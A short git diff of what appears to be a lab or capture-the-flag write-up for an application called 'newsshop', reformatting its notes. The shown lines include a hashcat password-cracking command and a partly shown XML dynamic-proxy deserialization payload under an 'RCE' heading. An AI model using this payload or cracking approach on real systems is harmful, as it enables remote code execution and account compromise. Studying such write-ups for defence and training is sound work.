@@ -35,8 +35,7 @@ hashcat -m 3200 -a 0 hashes /usr/share/wordlists/seclists/Passwords/Common-Crede
 # RCE:
 
 ## Payload:
-
-  GNU nano 8.3                                                                                 payload.xml                                                                                          
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <newsletter class="dynamic-proxy">
     <interface>com.andrena.newsshop.model.Newsletterable</interface>
@@ -53,7 +52,7 @@ hashcat -m 3200 -a 0 hashes /usr/share/wordlists/seclists/Passwords/Common-Crede
         <action>start</action>
     </handler>
 </newsletter>
-
+```
 
 ## curl:
 
